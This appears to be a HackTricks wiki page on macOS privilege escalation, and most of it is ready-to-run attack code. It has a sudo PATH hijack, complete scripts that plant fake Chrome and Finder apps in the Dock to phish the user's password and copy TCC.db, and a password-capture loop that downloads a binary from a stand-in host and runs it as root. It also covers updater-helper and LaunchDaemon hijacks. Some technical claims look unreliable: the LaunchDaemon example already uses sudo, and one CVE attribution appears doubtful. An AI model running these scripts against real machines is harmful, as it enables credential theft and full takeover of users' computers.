# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Some suggestions:

- Check in the Dock if there is a Chrome, and in that case **remove** that entry and **add** the **fake** **Chrome entry in the same position** in the Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Some suggestions:

- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
- Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
  - Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
  - Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequently abuses user interaction to **capture a sudo-capable password** and reuse it programmatically. A common flow:

1. Identify the logged in user with `whoami`.
2. **Loop password prompts** until `dscl . -authonly "$user" "$pw"` returns success.
3. Cache the credential (e.g., `/tmp/.pass`) and drive privileged actions with `sudo -S` (password over stdin).

Example minimal chain:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.

## Newer macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges` was deprecated in 10.7 but **still works on Sonoma/Sequoia**. Many commercial updaters invoke `/usr/libexec/security_authtrampoline` with an untrusted path. If the target binary is user-writable you can plant a trojan and ride the legitimate prompt:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combine with the **masquerading tricks above** to present a believable password dialog.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

If a LaunchDaemon plist or its `ProgramArguments` target is **user-writable**, you can escalate by swapping it then forcing launchd to reload:

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.securemonitor</string>
  <key>ProgramArguments</key>
  <array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```

This mirrors the exploit pattern published for **CVE-2025-24085**, where a writable plist was abused to execute attacker code as root.

### XNU SMR credential race (CVE-2025-24118)

A **race in `kauth_cred_proc_update`** lets a local attacker corrupt the read-only credential pointer (`proc_ro.p_ucred`) by racing `setgid()`/`getgid()` loops across threads until a torn `memcpy` occurs. Successful corruption yields **uid 0** and kernel memory access. Minimal PoC structure:

```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```

Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`). The chain:

1. Obtain root on a live system.
2. Trigger `systemmigrationd` with crafted state to run an attacker-controlled binary.
3. Use inherited entitlement to patch SIP-protected files, persisting even after reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

<details>
<summary>Mount Time Machine snapshot</summary>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

</details>

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Sensitive Information

This can be useful to escalate privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
